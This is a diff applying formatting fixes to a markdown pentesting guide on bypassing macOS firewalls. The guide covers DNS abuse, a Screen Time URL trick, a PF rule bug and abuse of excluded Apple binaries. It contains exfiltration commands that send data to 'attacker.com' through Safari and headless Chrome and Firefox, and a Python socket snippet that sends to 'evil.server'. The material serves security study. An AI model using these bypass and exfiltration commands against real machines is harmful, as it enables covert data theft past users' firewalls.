@@ -1,6 +1,5 @@
 # macOS Bypassing Firewalls
 
-
 ## Found techniques
 
 The following techniques were found working in some macOS firewall apps.
@@ -32,13 +31,12 @@ Knowing the allowed traffic will help you identify potentially whitelisted domai
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
-```
+
 ### Abusing DNS
 
 DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
 
-![[../../images/image (468).png|https://www.youtube.com/watch?v=UlT5KFTMn2k]]
-
+![https://www.youtube.com/watch?v=UlT5KFTMn2k](../../images/image (468).png)
 
 ### Via Browser apps
 
@@ -52,25 +50,25 @@ tell application "Safari"
     set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-```
+
 - Google Chrome
 
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-```
+
 - Firefox
 
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-```
+
 - Safari
 
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-```
+
 ### Via processes injections
 
 If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
@@ -91,7 +89,7 @@ Practical test (un-patched system):
 open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
 # if the patch is missing Safari will happily load the page
 ```
-```
+
 ### Packet Filter (PF) rule-ordering bug in early macOS 14 “Sonoma”
 During the macOS 14 beta cycle Apple introduced a regression in the userspace wrapper around **`pfctl`**.
 Rules that were added with the `quick` keyword (used by many VPN kill-switches) were silently ignored, causing traffic leaks even when a VPN/firewall GUI reported *blocked*. The bug was confirmed by several VPN vendors and fixed in RC 2 (build 23A344).
@@ -102,7 +100,7 @@ Quick leak-check:
 pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
-```
+
 ### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
 Before macOS 11.2 the **`ContentFilterExclusionList`** allowed ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.).
 Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.
@@ -117,7 +115,7 @@ subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store
 s = socket.create_connection(("evil.server", 443))
 s.send(b"exfil...")
 ```
-```
+
 ---
 
 ## Tooling tips for modern macOS
@@ -136,7 +134,7 @@ s.send(b"exfil...")
 
 ## References
 
-- [[https://www.youtube.com/watch?v=UlT5KFTMn2k|https://www.youtube.com/watch?v=UlT5KFTMn2k]]
+- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 - <https://nosebeard.co/advisories/nbl-001.html>
 - <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
 
